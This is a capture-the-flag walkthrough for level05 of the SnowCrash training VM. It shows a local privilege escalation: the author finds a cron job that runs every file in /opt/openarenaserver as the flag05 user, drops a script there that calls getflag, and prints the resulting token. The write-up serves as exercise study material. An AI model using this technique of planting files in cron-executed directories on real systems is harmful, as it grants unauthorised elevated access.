# Step 1
-   We log to the VM with ssh as `level05` user.

    ```bash
    ssh level05@10.27.26.127 -p 4242
    ```

    `You have new mail.`

    `level05@SnowCrash:~$`

-   We explore the path to locate email and we find the `$MAIL` variable in the env.

    `MAIL=/var/mail/level05`

    content of the file above

    `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

-   This is a cron job that runs every 2 minutes and executes the `openarenaserver` script as `flag05` user.

    We add this job to our crontab

    ```bash
    crontab -e
    ```


# Step 2

We analyze the `/usr/sbin/openarenaserver` script.

content of the script: 
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It loops through all files in `/opt/openarenaserver/` and executes them with a 5 seconds timeout. So we can create a file in this directory and it will be executed.

# Step 3

We create a script in `/opt/openarenaserver/` that will run the `getflag` command and write the output to a file in `/tmp/`.

```bash
echo '#!/bin/sh' > /opt/openarenaserver/flag.sh
echo "getflag > /tmp/flag" >> /opt/openarenaserver/flag.sh
chmod +x /opt/openarenaserver/flag.sh
```

### Result
    
```bash
level05@SnowCrash:~$ cat /tmp/flag
```

`Check flag.Here is your token : viuaaale9huek52boumoomioc`

No password needed for `flag05` user.
